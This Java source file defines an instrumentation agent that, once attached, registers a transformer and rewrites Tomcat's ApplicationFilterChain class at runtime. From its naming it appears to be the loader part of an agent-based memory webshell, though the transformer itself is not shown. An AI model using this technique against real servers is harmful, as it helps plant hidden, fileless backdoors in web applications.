package forTomcat;

import java.lang.instrument.Instrumentation;
import java.lang.instrument.UnmodifiableClassException;

public class Agent {
    public static void agentmain(String agentArgs, Instrumentation inst) throws UnmodifiableClassException {
        Mytransformer mytransformer = new Mytransformer();
        inst.addTransformer(mytransformer,true);
        Class[] classes = inst.getAllLoadedClasses();
        for (Class cl:classes
             ) {
            if (cl.getName().startsWith("org.apache.catalina.core.ApplicationFilterChain")){
                inst.retransformClasses(cl);
            }
            
        }
    }
}
